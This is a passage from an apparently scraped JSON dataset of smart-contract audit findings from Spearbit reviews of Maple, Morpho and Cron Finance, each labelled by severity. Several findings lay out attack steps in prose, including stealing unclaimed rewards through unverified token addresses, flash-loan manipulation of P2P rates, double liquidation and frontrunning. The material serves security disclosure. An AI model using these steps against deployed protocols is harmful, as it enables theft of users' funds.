        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MapleV2.pdf",
        "body": "The MapleLoanInitializer could verify additional arguments to avoid bad pool deployments.",
        "labels": [
            "Spearbit",
            "MapleV2.pd",
            "Severity: Informational"
        ]
    },
    {
        "title": "Clean up updatePlatformServiceFee",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MapleV2.pdf",
        "body": "The updatePlatformServiceFee can be cleaned up to use an existing helper function",
        "labels": [
            "Spearbit",
            "MapleV2.pd",
            "Severity: Informational"
        ]
    },
    {
        "title": "Document restrictions on Refinancer",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MapleV2.pdf",
        "body": "The refinancer may not set unexpected storage slots, like changing the _fundsAsset because _- drawableFunds, _refinanceInterest are still measured in the old fund's asset.",
        "labels": [
            "Spearbit",
            "MapleV2.pd",
            "Severity: Informational"
        ]
    },
    {
        "title": "Typos / Incorrect documentation",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MapleV2.pdf",
        "body": "The code and comments contain typos or are sometimes incorrect.",
        "labels": [
            "Spearbit",
            "MapleV2.pd",
            "Severity: Informational"
        ]
    },
    {
        "title": "Wrong P2P exchange rate calculation",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Spearbit-Security-Review.pdf",
        "body": "_p2pDelta is divided by _poolIndex and multiplied by _p2pRate, nevertheless it should have been multiplied by _poolIndex and divided by _p2pRate to compute the correct share of the delta. This leads to wrong P2P rates throughout all markets if supply / borrow delta is involved.",
        "labels": [
            "Spearbit",
            "Morpho",
            "Severity: Critical Risk"
        ]
    },
    {
        "title": "MatchingEngineForAave is using the wrong totalSupply in updateBorrowers",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Spearbit-Security-Review.pdf",
        "body": "_poolTokenAddress is referencing AToken so the totalStaked would be the total supply of the AToken. In this case, the totalStaked should reference the total supply of the DebtToken, otherwise the user would be rewarded for a wrong amount of reward.",
        "labels": [
            "Spearbit",
            "Morpho",
            "Severity: Critical Risk"
        ]
    },
    {
        "title": "RewardsManagerAave does not verify token addresses",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Spearbit-Security-Review.pdf",
        "body": "Aave has 3 different types of tokens: aToken, stable debt token and variable debt token (a/s/vToken). Aaves incentive controller can define rewards for all of them but Morpho never uses a stable-rate borrows token (sToken). The public accrueUserUnclaimedRewards function allows passing arbitrary token addresses for which to accrue user rewards. Current code assumes that if the token is not the variable debt token, then it must be the aToken, and uses the users supply balance for the reward calculation as follows: 5 uint256 stakedByUser = reserve.variableDebtTokenAddress == asset ? positionsManager.borrowBalanceInOf(reserve.aTokenAddress, _user).onPool : positionsManager.supplyBalanceInOf(reserve.aTokenAddress, _user).onPool; An attacker can accrue rewards by passing in an sToken address and steal from the contract, i.e:  Attacker supplies a large amount of tokens for which sToken rewards are defined.  The aToken reward index is updated to the latest index but the sToken index is not initialized.  Attacker calls accrueUserUnclaimedRewards([sToken]), which will compute the difference between the cur- rent Aave reward index and users sToken index, then multiply it by their supply balance.  The user accumulated rewards in userUnclaimedRewards[user] can be withdrawn by calling PositionMan- ager.claimRewards([sToken, ...]).  Attacker withdraws their supplied tokens again. The abovementioned steps can be performed in one single transaction to steal unclaimed rewards from all Morpho positions.",
        "labels": [
            "Spearbit",
            "Morpho",
            "Severity: Critical Risk"
        ]
    },
    {
        "title": "FullMath requires overflow behavior",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Spearbit-Security-Review.pdf",
        "body": "UniswapV3s FullMath.sol is copied and migrated from an old solidity version to version 0.8 which reverts on overflows but the old FullMath relies on the implicit overflow behavior. The current code will revert on overflows when it should not, breaking the SwapManagerUniV3 contract.",
        "labels": [
            "Spearbit",
            "Morpho",
            "Severity: High Risk"
        ]
    },
    {
        "title": "Morphos USDT mainnet market can end up in broken state",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Spearbit-Security-Review.pdf",
        "body": "Note that USDT on Ethereum mainnet is non-standard and requires resetting the approval to zero (see USDT L199) before being able to change it again. In _repayERC20ToPool , it could be that _amount is approved but then _amount = Math.min(...) only repays a smaller amount, meaning there remains a non-zero approval for Aave. Any further _repayERC20ToPool/_- supplyERC20ToPool calls will then revert in the approve call. Users cannot interact with most functions of the Morpho USDT market anymore. Example: Assume the attacker is first to borrow from the USDT market on Morpho.  Attacker borrows 1000 USDT through Morpho from the Aave pool (and some other collateral to cover the debt).  Attacker directly interacts with Aave to repay 1 USDT of debt for Aaves Morpho account position.  Attacker attempts to repay 1000 USDT on Morpho. the contracts debt balance is only 999 and the _amount = Math.min(_amount, variableDebtTo- ken.scaledBalanceOf(address(this)).mulWadByRay(_normalizedVariableDebt) computation will only repay 999. An approval of 1 USDT remains. It will approve 1000 USDT but  The USDT market is broken as it reverts on supply / repay calls when trying to approve the new amount",
        "labels": [
            "Spearbit",
            "Morpho",
            "Severity: High Risk"
        ]
    },
    {
        "title": "Wrong reserve factor computation on P2P rates",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Spearbit-Security-Review.pdf",
        "body": "The reserve factor is taken on the entire P2P supply and borrow rates instead of just on the spread of the pool rates. Its currently overcharging suppliers and borrowers and making it possible to earn a worse rate on Morpho than the pool rates. supplyP2PSPY[_marketAddress] = (meanSPY * (MAX_BASIS_POINTS - reserveFactor[_marketAddress])) / MAX_BASIS_POINTS; borrowP2PSPY[_marketAddress] = (meanSPY * (MAX_BASIS_POINTS + reserveFactor[_marketAddress])) / MAX_BASIS_POINTS;",
        "labels": [
            "Spearbit",
            "Morpho",
            "Severity: High Risk"
        ]
    },
    {
        "title": "SwapManager assumes Morpho token is token0 of every token pair",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Spearbit-Security-Review.pdf",
        "body": "The consult function wrongly assumes that the Morpho token is always the first token (token0) in the Morpho <> Reward token token pair. This could lead to inverted prices and a denial of service attack when claiming rewards as the wrongly calculated expected amount slippage check reverts.",
        "labels": [
            "Spearbit",
            "Morpho",
            "Severity: High Risk"
        ]
    },
    {
        "title": "SwapManager fails at updating TWAP",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Spearbit-Security-Review.pdf",
        "body": "The update function returns early without updating the TWAP if the elapsed time is past the TWAP period. Meaning, once the TWAP period passed the TWAP is stale and forever represents an old value. This could lead to a denial of service attack when claiming rewards as the wrongly calculated expected amount slippage check reverts.",
        "labels": [
            "Spearbit",
            "Morpho",
            "Severity: High Risk"
        ]
    },
    {
        "title": "P2P rate can be manipulated as its a lazy-updated snapshot",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Spearbit-Security-Review.pdf",
        "body": "The P2P rate is lazy-updated upon interactions with the Morpho protocol. It takes the mid-rate of Its possible to manipulate these rates before triggering an update on the current Aave supply and borrow rate. Morpho. function _updateSPYs(address _marketAddress) internal { DataTypes.ReserveData memory reserveData = lendingPool.getReserveData( IAToken(_marketAddress).UNDERLYING_ASSET_ADDRESS() ); uint256 meanSPY = Math.average( reserveData.currentLiquidityRate, reserveData.currentVariableBorrowRate ) / SECONDS_PER_YEAR; // In ray } Example: Assume an attacker has a P2P supply position on Morpho and wants to earn a very high APY on it. He does the following actions in a single transaction:  Borrow all funds on the desired Aave market. (This can be done by borrowing against flashloaned collateral).  The utilisation rate of the market is now 100%. The borrow rate is the max borrow rate and the supply rate is (1.0 - reserveFactor) * maxBorrowRate. The max borrow rate can be higher than 100% APY, see Aave docs.  The attacker triggers an update to the P2P rate, for example, by supplying 1 token to the pool Positions- ManagerForAave.supply(poolTokenAddress, 1, ...), triggering marketsManager.updateSPYs(_poolTo- kenAddress).  The new mid-rate is computed which will be (2.0 - reserveFactor) * maxBorrowRate / 2 ~ maxBor- rowRate.  The attacker repays their Aave debt in the same transaction, not paying any interest on it.  All P2P borrowers now pay the max borrow rate to the P2P suppliers until the next time a user interacts with the market on Morpho.  This process can be repeated to keep the APY high.",
        "labels": [
            "Spearbit",
            "Morpho",
            "Severity: High Risk"
        ]
    },
    {
        "title": "Liquidating Morphos Aave position leads to state desynchronization",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Spearbit-Security-Review.pdf",
        "body": "Morpho has a single position on Aave that encompasses all of Morphos individual user positions that are on the pool. When this Aave Morpho position is liquidated the user position state tracked in Morpho desynchronize from the actual Aave position. This leads to issues when users try to withdraw their collateral or repay their debt from Morpho. Its also possible to double-liquidate for a profit. Example: Theres a single borrower B1 on Morpho who is connected to the Aave pool.  B1 supplies 1 ETH and borrows 2500 DAI. This creates a position on Aave for Morpho  The ETH price crashes and the position becomes liquidatable.  A liquidator liquidates the position on Aave, earning the liquidation bonus. They repaid some debt and seized some collateral for profit.  This repaid debt / removed collateral is not synced with Morpho. The users supply and debt balance remain 1 ETH and 2500 DAI. The same user on Morpho can be liquidated again because Morpho uses the exact same liquidation parameters as Aave.  The Morpho liquidation call again repays debt on the Aave position and withdraws collateral with a second liquidation bonus.  The state remains desynced.",
        "labels": [
            "Spearbit",
            "Morpho",
            "Severity: High Risk"
        ]
    },
    {
        "title": "Frontrunners can exploit the system by not allowing head of DLL to match in P2P",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Spearbit-Security-Review.pdf",
        "body": "For a given asset X, liquidity is supplied on the pool since there are not enough borrowers. suppli- ersOnPool head: 0xa with 1000 units of x Whenever there is a new transaction in the mempool to borrow 100 units of x:  Frontrunner supplies 1001 units of x and is supplied on pool.  updateSuppliers will place the frontrunner on the head (assuming very high gas is supplied).  Borrowers transaction lands and is matched 100 units of x with a frontrunner in p2p.  Frontrunner withdraws the remaining 901 left which was on the underlying pool. Favorable conditions for an attack:  Relatively fewer gas fees & relatively high block gas limit.  insertSorted is able to traverse to head within block gas limit (i.e length of DLL). Since this is a non-atomic sandwich, the frontrunner needs excessive capital for a blocks time period.",
        "labels": [
            "Spearbit",
            "Morpho",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "TWAP intervals should be flexible as per market conditions",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Spearbit-Security-Review.pdf",
        "body": "The protocol is using the same TWAP_INTERVAL for both weth-morpho and weth-reward token pool while their liquidity and activity might be different. It should use separate appropriate values for both pools.",
        "labels": [
            "Spearbit",
            "Morpho",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "PositionsManagerForAave claimToTreasury could allow sending underlying to 0x address",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Spearbit-Security-Review.pdf",
        "body": "claimToTreasury is currently not verifying if the treasuryVault address is != address(0). In the current state, it would allow the owner of the contract to burn the underlying token instead of sending it to the intended treasury address.",
        "labels": [
            "Spearbit",
            "Morpho",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "rewardsManager used in MatchingEngineForAave could be not initialized",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Spearbit-Security-Review.pdf",
        "body": "MatchingEngineForAave update the userUnclaimedRewards for a supplier/borrower each time it gets updated. rewardsManager is not initialized in PositionsManagerForAaveLogic.initialize but only via Po- sitionsManagerForAaveGettersSetters.setRewardsManager, which means that it will start as address(0). Each time a supplier or borrower gets updated and the rewardsManager address is empty, the transaction will revert. To replicate the issue, just comment positionsManager.setRewardsManager(address(rewardsManager)); in TestSetup and run make c-TestSupply. All tests will fail with [FAIL. Reason: Address: low-level delegate call failed]",
        "labels": [
            "Spearbit",
            "Morpho",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Missing input validation checks on contract initialize/constructor",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Spearbit-Security-Review.pdf",
        "body": "Contract creation/initialization of a contract in a wrong/inconsistent state. initialize/constructor input parameters should always be validated to prevent the",
        "labels": [
            "Spearbit",
            "Morpho",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Setting a new rewards manager breaks claiming old rewards",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Spearbit-Security-Review.pdf",
        "body": "Setting a new rewards manager will break any old unclaimed rewards as users can only claim through the PositionManager.claimRewards function which then uses the new reward manager.",
        "labels": [
            "Spearbit",
            "Morpho",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Low/high MaxGas values could make match/unmatch supplier/borrower functions always fail or revert",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Spearbit-Security-Review.pdf",
        "body": "maxGas variable is used to determine how much gas the matchSuppliers, unmatchSuppliers, matchBorrowers and unmatchBorrowers can consume while trying to match/unmatch supplier/borrower and also updating their position if matched.  maxGas = 0 will make entirely skip the loop.  maxGas low would make the loop run at least one time but the smaller maxGas is the higher is the possibility that not all the available suppliers/borrowers are matched/unmatched.  maxGas could make the loop consume all the block gas, making the tx revert. Note that maxGas can be overriden by the user when calling supply, borrow",
        "labels": [
            "Spearbit",
            "Morpho",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "NDS min/max value should be properly validated to avoid tx to always fail/skip loop",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Spearbit-Security-Review.pdf",
        "body": "PositionsManagerForAaveLogic is currently initialized with a default value of NDS = 20. The NDS value is used by MatchingEngineForAave when it needs to call DoubleLinkedList.insertSorted in both updateBorrowers and updateSuppliers updateBorrowers, updateSuppliers are called by  MatchingEngineForAavematchBorrowers  MatchingEngineForAaveunmatchBorrowers  MatchingEngineForAavematchSuppliers  MatchingEngineForAaveunmatchSuppliers Those functions and also directly updateBorrowers and updateSuppliers are also called by PositionsManager- ForAaveLogic Problems:  A low NDS value would make the loop inside insertSorted exit early, increasing the probability of a sup- plier/borrower to be added to the tail of the list. This is something that Morpho would like to avoid because it would decrease protocol performance when it needs to match/unmatch suppliers/borrowers.  In the case where a list is long enough, a very high value would make the tranaction revert each time one of those function directly or indirectly call insertSorted. The gas rail guard present in the match/unmatch supplier/borrow is useless because the loop would be called at least one time.",
        "labels": [
            "Spearbit",
            "Morpho",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Initial SwapManager cumulative prices values are wrong",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Spearbit-Security-Review.pdf",
        "body": "The initial cumulative price values are integer divisions of unscaled reserves and not UQ112x112 fixed-point values. (reserve0, reserve1, blockTimestampLast) = pair.getReserves(); price0CumulativeLast = reserve1 / reserve0; price1CumulativeLast = reserve0 / reserve1; One of these values will (almost) always be zero due to integer division. Then, when the difference is taken to the real currentCumulativePrices in update, the TWAP will be a large, wrong value. The slippage checks will not work correctly.",
        "labels": [
            "Spearbit",
            "Morpho",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "User withdrawals can fail if Morpho position is close to liquidation",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Spearbit-Security-Review.pdf",
        "body": "When trying to withdraw funds from Morpho as a P2P supplier the last step of the withdrawal algorithm borrows an amount from the pool (\"hard withdraw\"). If Morphos position on Aaves debt / collateral value is higher than the markets maximum LTV ratio but lower than the markets liquidation threshold, the borrow will fail and the position cannot be liquidated. Therefore withdrawals could fail.",
        "labels": [
            "Spearbit",
            "Morpho",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Event Withdrawn is emitted using the wrong amounts of supplyBalanceInOf",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Spearbit-Security-Review.pdf",
        "body": "Inside the _withdraw function, all changes performed to supplyBalanceInOf are done using the _supplier address. The _receiver is correctly used only to transfer the underlying token via underlyingToken.safeTransfer(_- receiver, _amount); The Withdrawn event should be emitted passing the supplyBalanceInOf[_poolTokenAddress] of the supplier and not the receiver. This problem will arise when this internal function is called by PositionsManagerForAave.liquidate where sup- plier (borrower in this case) and receiver (liquidator) would not be the same address.",
        "labels": [
            "Spearbit",
            "Morpho",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "_repayERC20ToPool is approving the wrong amount",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Spearbit-Security-Review.pdf",
        "body": "_repayERC20ToPool is approving the amount of underlying token specified via the input parameter _amount when the correct amount that should be approved is the one calculated via: _amount = Math.min( _amount, variableDebtToken.scaledBalanceOf(address(this)).mulWadByRay(_normalizedVariableDebt) );",
        "labels": [
            "Spearbit",
            "Morpho",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Possible unbounded loop over enteredMarkets array in _getUserHypotheticalBalanceStates",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Spearbit-Security-Review.pdf",
        "body": "PositionsManagerForAaveLogic._getUserHypotheticalBalanceStates is looping enteredMar- kets which could be an unbounded array leading to a reverted transaction caused by a block gas limit. While it is true that Morpho will probably handle a subset of assets controlled by Aave, this loop could still revert because of gas limits for a variety of reasons:  In the future Aave could have more assets and Morpho could match 1:1 those assets.  Block gas size could decrease.  Opcodes could cost more gas.",
        "labels": [
            "Spearbit",
            "Morpho",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Missing parameter validation on setters and event spamming prevention",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Spearbit-Security-Review.pdf",
        "body": "User parameter validity should always be verified to prevent contract updates in an inconsistent state. The parameters value should also be different from the old one in order to prevent event spamming (emitting an event when not needed) and improve contract monitoring. contracts/aave/RewardsManagerForAave.sol 20 function setAaveIncentivesController(address _aaveIncentivesController) external override onlyOwner { + + } require(_aaveIncentivesController != address(0), \"param != address(0)\"); require(_aaveIncentivesController != aaveIncentivesController, \"param != prevValue\"); aaveIncentivesController = IAaveIncentivesController(_aaveIncentivesController); emit AaveIncentivesControllerSet(_aaveIncentivesController); contracts/aave/MarketsManagerForAave.sol function setReserveFactor(address _marketAddress, uint16 _newReserveFactor) external onlyOwner { reserveFactor[_marketAddress] = HALF_MAX_BASIS_POINTS <= _newReserveFactor ? HALF_MAX_BASIS_POINTS : _newReserveFactor; updateRates(_marketAddress); emit ReserveFactorSet(_marketAddress, reserveFactor[_marketAddress]); require(_marketAddress != address(0), \"param != address(0)\"); uint16 finalReserveFactor = HALF_MAX_BASIS_POINTS <= _newReserveFactor ? HALF_MAX_BASIS_POINTS : _newReserveFactor; if( finalReserveFactor !== reserveFactor[_marketAddress] ) { reserveFactor[_marketAddress] = finalReserveFactor; emit ReserveFactorSet(_marketAddress, finalReserveFactor); } updateRates(_marketAddress); - - - - - - - + + + + + + + + + + + } function setNoP2P(address _marketAddress, bool _noP2P) external onlyOwner isMarketCreated(_marketAddress) { + } require(_noP2P != noP2P[_marketAddress], \"param != prevValue\"); noP2P[_marketAddress] = _noP2P; emit NoP2PSet(_marketAddress, _noP2P); function updateP2PExchangeRates(address _marketAddress) external override onlyPositionsManager isMarketCreated(_marketAddress) _updateP2PExchangeRates(_marketAddress); + { } 21 function updateSPYs(address _marketAddress) external override onlyPositionsManager isMarketCreated(_marketAddress) _updateSPYs(_marketAddress); + { } contracts/aave/positions-manager-parts/PositionsManagerForAaveGettersSetters.sol function setAaveIncentivesController(address _aaveIncentivesController) external onlyOwner { require(_aaveIncentivesController != address(0), \"param != address(0)\"); require(_aaveIncentivesController != aaveIncentivesController, \"param != prevValue\"); aaveIncentivesController = IAaveIncentivesController(_aaveIncentivesController); emit AaveIncentivesControllerSet(_aaveIncentivesController); + + } Important note: _newNDS min/max value should be accurately validated by the team because this will influence the maximum number of cycles that DDL.insertSorted can do. Setting a value too high would make the transaction fail while setting it too low would make the insertSorted loop exit earlier, resulting in the user being added to the tail of the list. A more detailed issue about the NDS value can be found here: #33 function setNDS(uint8 _newNDS) external onlyOwner { // add a check on `_newNDS` validating correctly max/min value of `_newNDS` require(NDS != _newNDS, \"param != prevValue\"); NDS = _newNDS; emit NDSSet(_newNDS); + + } Important note: _newNDS set to 0 would skip all theMatchingEngineForAave match/unmatch supplier/borrower functions if the user does not specify a custom maxGas A more detailed issue about NDS value can be found here: #34 function setMaxGas(MaxGas memory _maxGas) external onlyOwner { // add a check on `_maxGas` validating correctly max/min value of `_maxGas` // add a check on `_maxGas` internal value checking that at least one of them is different compared to the old version maxGas = _maxGas; emit MaxGasSet(_maxGas); + + ,! } function setTreasuryVault(address _newTreasuryVaultAddress) external onlyOwner { require(_newTreasuryVaultAddress != address(0), \"param != address(0)\"); require(_newTreasuryVaultAddress != treasuryVault, \"param != prevValue\"); treasuryVault = _newTreasuryVaultAddress; emit TreasuryVaultSet(_newTreasuryVaultAddress); + + } function setRewardsManager(address _rewardsManagerAddress) external onlyOwner { require(_rewardsManagerAddress != address(0), \"param != address(0)\"); require(_rewardsManagerAddress != rewardsManager, \"param != prevValue\"); rewardsManager = IRewardsManagerForAave(_rewardsManagerAddress); emit RewardsManagerSet(_rewardsManagerAddress); + + } Important note: Should also check that _poolTokenAddress is currently handled by the PositionsManagerForAave and by the MarketsManagerForAave. Without this check a poolToken could start in a paused state. 22 + function setPauseStatus(address _poolTokenAddress) external onlyOwner { require(_poolTokenAddress != address(0), \"param != address(0)\"); bool newPauseStatus = !paused[_poolTokenAddress]; paused[_poolTokenAddress] = newPauseStatus; emit PauseStatusSet(_poolTokenAddress, newPauseStatus); }",
        "labels": [
            "Spearbit",
            "Morpho",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "DDL should prevent inserting items with 0 value",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Spearbit-Security-Review.pdf",
        "body": "Currently the DDL library is only checking that the actual value (_list.accounts[_id].value) in the list associated with the _id is 0 to prevent inserting duplicates. The DDL library should also verify that the inserted value is greater than 0. This check would prevent adding users with empty values, which may potentially cause the list and as a result the overall protocol to underperform.",
        "labels": [
            "Spearbit",
            "Morpho",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "insertSorted iterates more than max iterations parameter",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Spearbit-Security-Review.pdf",
        "body": "The insertSorted function iterates _maxIterations + 1 times instead of _maxIterations times.",
        "labels": [
            "Spearbit",
            "Morpho",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "insertSorted does not behave like a FIFO for same values",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Spearbit-Security-Review.pdf",
        "body": "Users that have the same value are inserted into the list before other users with the same value. It does not respect the \"seniority\" of the users order and should behave more like a FIFO queue.",
        "labels": [
            "Spearbit",
            "Morpho",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "insertSorted inserts elements at wrong index",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Spearbit-Security-Review.pdf",
        "body": "The insertSorted function inserts elements after the last element has been insterted, when these should have actually been insterted before the last element. The sort order is therefore wrong, even if the maximum iterations count has not been reached. This is because of the check that the current element is not the tail. if ( ... && current != _list.tail) { insertBefore } else { insertAtEnd } Example:  list = [20]. insert(40) then current == list.tail, and is inserted at the back instead of the front. result = [20, 40]  list = [30, 10], insert(20) insertion point should be before current == 10, but also current == tail therfore the current != _list.tail condition is false and the element is wrongly inserted at the end. result = [30, 10, 20]",
        "labels": [
            "Spearbit",
            "Morpho",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "PositionsManagerForAaveLogic gas optimization suggestions",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Spearbit-Security-Review.pdf",
        "body": "Update the remainingTo variable only when needed. Inside each function, the remainingTo counter could be moved inside the if statement to avoid calculation when the amount that should be subtracted is >0.",
        "labels": [
            "Spearbit",
            "Morpho",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "MarketsManagerForAave._updateSPYs could store calculations in local variables to save gas",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Spearbit-Security-Review.pdf",
        "body": "The calculation in the actual code must be updated following this issue: #36. This current issue is an example on how to avoid an additional SLOAD. The function could store locally currentReserveFactor, newSupplyP2PSPY and newBorrowP2PSPY to avoid addi- tional SLOAD",
        "labels": [
            "Spearbit",
            "Morpho",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Declare variable as immutable/constant and remove unused variables",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Spearbit-Security-Review.pdf",
        "body": "Some state variable can be declared as immutable or constant to save gas. Constant variables should be names in uppercase + snake case following the official Solidity style guide. Additionally, variables which are never used across the protocol code can be removed to save gas during deployment and improve readability. RewardsManagerForAave.sol -ILendingPoolAddressesProvider public addressesProvider; -ILendingPool public lendingPool; +ILendingPool public immutable lendingPool; -IPositionsManagerForAave public positionsManager; +IPositionsManagerForAave public immutable positionsManager; SwapManagerUniV2.sol -IUniswapV2Router02 public swapRouter = IUniswapV2Router02(0x60aE616a2155Ee3d9A68541Ba4544862310933d4); // JoeRouter ,! +IUniswapV2Router02 public constant SWAP_ROUTER = ,! IUniswapV2Router02(0x60aE616a2155Ee3d9A68541Ba4544862310933d4); // JoeRouter -IUniswapV2Pair public pair; +IUniswapV2Pair public immutable pair; SwapManagerUniV3.sol 27 -ISwapRouter public swapRouter = ISwapRouter(0xE592427A0AEce92De3Edee1F18E0157C05861564); // The Uniswap V3 router. ,! +ISwapRouter public constant SWAP_ROUTER = ISwapRouter(0xE592427A0AEce92De3Edee1F18E0157C05861564); // ,! The Uniswap V3 router. -address public WETH9; // Intermediate token address. +address public immutable WETH9; // Intermediate token address. -IUniswapV3Pool public pool0; +IUniswapV3Pool public immutable pool0; -IUniswapV3Pool public pool1; +IUniswapV3Pool public immutable pool1; -bool public singlePath; +bool public boolean singlePath; SwapManagerUniV3OnEth.sol -ISwapRouter public swapRouter = ISwapRouter(0xE592427A0AEce92De3Edee1F18E0157C05861564); // The Uniswap V3 router. ,! +ISwapRouter public constant SWAP_ROUTER = ISwapRouter(0xE592427A0AEce92De3Edee1F18E0157C05861564); // ,! The Uniswap V3 router. -IUniswapV3Pool public pool0; +IUniswapV3Pool public immutable pool0; -IUniswapV3Pool public pool1; +IUniswapV3Pool public immutable pool1; -IUniswapV3Pool public pool2; +IUniswapV3Pool public immutable pool2;",
        "labels": [
            "Spearbit",
            "Morpho",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Function does not revert if balance to transfer is zero",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Spearbit-Security-Review.pdf",
        "body": "Currently when the claimToTreasury() function is called it gets the amountToClaim by using un- derlyingToken.balanceOf(address(this). It then uses this amountToClaim in the safeTransfer() function and the ReserveFeeClaimed event is emitted. The problem is that the function does not take into account that it is possible for the amountToClaim to be 0. In this case the safeTransfer function would still be called and the ReserveFeeClaimed event would still be emitted unnecessarily.",
        "labels": [
            "Spearbit",
            "Morpho",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "matchingEngine should be initialized in PositionsManagerForAaveLogics initialize function",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Spearbit-Security-Review.pdf",
        "body": "MatchingEngineForAave inherits from PositionsManagerForAaveStorage which is an UUPSUp- gradeable contract. Following UUPS best practices, should also be initialized. the MatchingEngineForAave deployed by PositionsManagerForAaveLogic",
        "labels": [
            "Spearbit",
            "Morpho",
            "Severity: Informational"
        ]
    },
    {
        "title": "Misc: notation, style guide, global unit types, etc",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Spearbit-Security-Review.pdf",
        "body": "Follow solidity notation, standard style guide and global unit types to improve readability.",
        "labels": [
            "Spearbit",
            "Morpho",
            "Severity: Informational"
        ]
    },
    {
        "title": "Outdated or wrong Natspec documentation",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Spearbit-Security-Review.pdf",
        "body": "Some Natspec documentation is missing parameters/return value or is not correctly updated to reflect the function code.",
        "labels": [
            "Spearbit",
            "Morpho",
            "Severity: Informational"
        ]
    },
    {
        "title": "Use the official UniswapV3 0.8 branch",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Spearbit-Security-Review.pdf",
        "body": "The current repository creates local copies of the UniswapV3 codebase and manually migrates the contracts to Solidity 0.8.",
        "labels": [
            "Spearbit",
            "Morpho",
            "Severity: Informational"
        ]
    },
    {
        "title": "Unused events and unindexed event parameters",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Spearbit-Security-Review.pdf",
        "body": "Certain parameters should be defined as indexed to track them from web3 applications / security monitoring tools.",
        "labels": [
            "Spearbit",
            "Morpho",
            "Severity: Informational"
        ]
    },
    {
        "title": "Rewards are ignored in the on-pool rate computation",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Spearbit-Security-Review.pdf",
        "body": "Morpho claims that the protocol is a strict improvement upon the underlying lending protocols. It tries to match as many suppliers and borrowers P2P at the supply/borrow mid-rate of the underlying protocol. However, given high reward incentives paid out to on-pool users it could be the case that being on the pool yields a better rate than the P2P rate.",
        "labels": [
            "Spearbit",
            "Morpho",
            "Severity: Informational"
        ]
    },
    {
        "title": "Balancer Read-Only Reentrancy Vulnerability (Changes from dev team added to audit.)",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/CronFinance-Spearbit-Security-Review.pdf",
        "body": "Balancer's read-only reentrancy vulnerability potentially effects the following Cron-Fi TWAMM func- tions:  getVirtualReserves  getVirtualPriceOracle  executeVirtualOrdersToBlock A mitigation was provided by the Balancer team that uses a minimum amount of gas to trigger a reentrancy check. The Balancer vulnerability is discussed in greater detail here:  reentrancy-vulnerability-scope-expanded/4345",
        "labels": [
            "Spearbit",
            "CronFinance",
